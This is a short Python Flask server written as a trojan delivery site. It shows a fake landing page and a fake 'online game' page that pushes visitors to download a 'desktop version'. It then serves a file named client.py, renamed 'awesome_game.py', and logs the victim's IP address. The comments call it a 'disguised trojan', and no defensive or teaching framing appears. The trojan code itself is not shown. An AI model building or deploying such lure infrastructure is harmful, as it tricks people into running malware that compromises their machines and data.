from flask import Flask, render_template, request, send_file
import os 

# Create app 
app = Flask(__name__)

@app.route("/")
def home(): 
    """Fake landing page"""
    return render_template("index.html")

@app.route("/download")
def download(): 
    """Serve disguised trojan"""
    victim_ip = request.remote_addr
    print(f"Downloading trojan on {victim_ip}")
    return send_file('client.py',
                     as_attachment=True,
                     download_name='awesome_game.py')

@app.route("/play")
def play_online():
    """Fake online version of game"""
    return """
    <h1>Loading Game...</h1>
    <p>For better performance, download our desktop version!</p>
    <a href="/download">Download Game</a>
    """


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)